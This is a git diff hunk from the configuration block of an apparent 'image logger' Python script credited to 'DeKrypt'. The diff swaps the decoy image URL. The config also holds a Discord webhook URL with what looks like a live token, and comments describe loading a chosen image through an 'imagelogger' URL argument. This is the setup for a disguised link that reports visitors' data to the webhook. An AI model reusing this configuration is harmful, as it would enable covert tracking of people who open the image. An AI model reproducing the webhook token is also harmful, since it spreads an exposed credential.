@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1338653082690523156/tEa1GAcoiGFczhG4wmObYsoobleszo1MPdwGU9gGgKPhUtIrh18eRXMouGLjfvHiJo7D",
-    "image": "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdm8zcXY2MzBjOTl3NGEwNTY1MHk1dTBuMGM5eWRsc2V6aWtoM2M1ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/CAYVZA5NRb529kKQUc/giphy.gif", # You can also have a custom image by using a URL argument
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=jo%2b0RKWR&id=263DE587C4095B03682C9477A9E05960513192BA&thid=OIP.jo-0RKWRXy9uSqKSSF1zjwHaHl&mediaurl=https%3a%2f%2fus-tuna-sounds-images.voicemod.net%2f292b753d-cae8-43d9-b101-5972206488df-1715203080783.png&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.8e8fb444a5915f2f6e4aa292485d738f%3frik%3dupIxUWBZ4Kl3lA%26pid%3dImgRaw%26r%3d0&exph=571&expw=557&q=brainrot+meme&simid=608026005594974966&FORM=IRPRST&ck=E9466A3850B737D39B872208D4700225&selectedIndex=17&itb=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
